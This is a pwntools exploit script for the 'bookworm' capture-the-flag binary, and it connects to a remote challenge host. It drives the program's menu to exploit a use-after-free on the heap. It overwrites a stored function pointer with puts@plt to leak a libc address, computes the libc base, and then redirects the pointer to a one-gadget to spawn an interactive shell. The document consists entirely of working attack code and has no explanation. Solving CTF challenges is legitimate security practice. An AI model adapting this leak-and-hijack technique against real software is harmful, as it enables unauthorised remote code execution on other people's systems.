from pwn import *
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./bookworm'],env={"LD_PRELOAD":"./libc.so.6"})
target=remote('cha.hackpack.club',41720)
libc=ELF('./libc.so.6')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="break *0x400e53")

bookcase=0x6020c0

print(target.recvuntil(">> "))

def create(namesize,name,sumsize,summ):
    target.sendline("1")
    print(target.recvuntil("size: "))
    target.sendline(str(namesize))
    print(target.recvuntil("name: "))
    target.sendline(name)
    print(target.recvuntil("size: "))
    target.sendline(str(sumsize))
    print(target.recvuntil("summary: "))
    target.sendline(summ)
    print(target.recvuntil(">> "))

def delete(index):
    target.sendline("2")
    print(target.recvuntil(": "))
    target.sendline(str(index))
    print(target.recvuntil(">> "))

def change(index,sumsize,summ):
    target.sendline("3")
    print(target.recvuntil(": "))
    target.sendline(str(index))
    print(target.recvuntil("size: "))
    target.sendline(str(sumsize))
    print(target.recvuntil("summary: "))
    target.sendline(summ)
    print(target.recvuntil(">> "))

def read(index):
    target.sendline("4")
    print(target.recvuntil(": "))
    target.sendline(str(index))
    leak=target.recvline().strip("\n")
    print(target.recvuntil(">> "))
    return leak

create(0x17,"A"*8,0x17,"B"*8)
delete(0)
puts_plt=0x400700
puts_got=0x602020
payload=p64(puts_plt)+p64(0xdeadbeef)+p64(puts_got)[0:7]
create(0x17,payload,0x17,"C"*0x17)
leak=read(0)
libc_puts=u64(leak+"\x00"*(8-len(leak)))
print("libc_puts="+hex(libc_puts))
libc_base=libc_puts-libc.symbols["puts"]
print("libc_base="+hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
gadget=0x10a38c
libc_gadget=libc_base+gadget
delete(1)
payload=p64(libc_gadget)+p64(0xdeadbeef)+p64(libc_binsh)[0:7]
create(0x17,payload,0x17,"C"*0x17)

target.sendline("4")
print(target.recvuntil(": "))
target.sendline("1")

target.interactive()






